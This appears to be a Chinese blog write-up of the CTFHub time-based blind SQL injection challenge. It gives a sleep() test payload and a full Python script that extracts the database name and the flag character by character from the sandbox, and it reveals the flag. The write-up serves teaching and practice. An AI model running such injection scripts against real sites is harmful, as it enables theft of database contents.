---
title: CTFHub 时间盲注
date: 2026-09-28
categories: CTFHub Web
tags: CTFHub Web SQL注入 时间盲注
---
# 题目： CTFHub 时间盲注

## 题目描述
CTFHub‑SQL时间盲注，页面无回显、无真假状态提示，无论条件正确还是错误页面返回完全一样。利用MySQL  sleep() 函数，根据页面响应延时长短判断SQL语句执行结果。
 
## 解题思路
id 参数直接拼接进SQL查询，页面不会输出任何查询数据，也不会返回真假提示。
使用 if(条件,sleep(2),1) ：
- SQL条件成立 → 执行 sleep(2) ，网页会延迟2秒才加载完成
- SQL条件不成立 → 直接执行1，网页瞬间返回
脚本测量HTTP请求消耗时间，延时大于1.5秒即判定条件为真。结合 substr() 截取字符、 ascii() 转ASCII码，逐位猜解数据。

## 解题步骤
1. 验证时间注入点
   访问Payload测试延时效果
   ？id=1 and sleep（2）
   页面明显延时2秒加载，确认时间盲注漏洞存在。
2. 打开PyCharm运行以下脚本
   import requests
import time

base_url = "http://challenge-72dd2188223498f8.sandbox.ctfhub.com:10800/"

def get_char(payload):
    for _ in range(2):  # 出错重试2次
        try:
            start = time.time()
            requests.get(base_url + payload, timeout=10)
            cost = time.time() - start
            return cost > 1.5
        except Exception:
            time.sleep(1)
    return False

#获取数据库名
db_name = ""
print("正在获取数据库名...")
for pos in range(1,20):
    for asc in range(48,123):
        pay = f'?id=1 and if(ascii(substr(database(),{pos},1))={asc},sleep(2),1)'
        if get_char(pay):
            db_name += chr(asc)
            print(f"数据库：{db_name}")
            break

table = "flag"
print(f"\n表名直接指定：{table}")

#爆破flag
flag = ""
print("\n正在爆破flag......")
for pos in range(1,50):
    for asc in range(48,123):
        pay = f'?id=1 and if(ascii(substr((select flag from {table} limit 0,1),{pos},1))={asc},sleep(2),1)'
        if get_char(pay):
            flag += chr(asc)
            print(f"flag片段：{flag}")
            break

print("\n====最终flag====")
print(flag)

脚本运行得到数据库名 sqli ，表名 flag ，最终flag： ctfhub{c2aec143d7a94ee0a50b0b56}

## 踩坑指南
1. 时间盲注速度最慢，每猜对一个字符就要等待sleep延时，需要耐心等待输出。
2. 靶场网络波动会出现连接报错，脚本增加异常捕获、失败重试，防止程序直接终止。
3. CTFHub靶场会超时过期，如果脚本长时间无输出，先浏览器确认靶场是否存活，更新 base_url 。
4. substr 起始下标从1开始，不是0。
 
## 知识点总结
1. 时间盲注适用场景：页面没有任何输出、没有真假差异，只能依靠响应时间判断SQL执行结果。
2. MySQL  if(条件,表达式1,表达式2) ：条件成立执行表达式1，不成立执行表达式2。
3. sleep(n) 函数，使SQL语句暂停n秒。
4. 网络请求容易出现超时异常，写脚本需要增加try‑except异常处理。
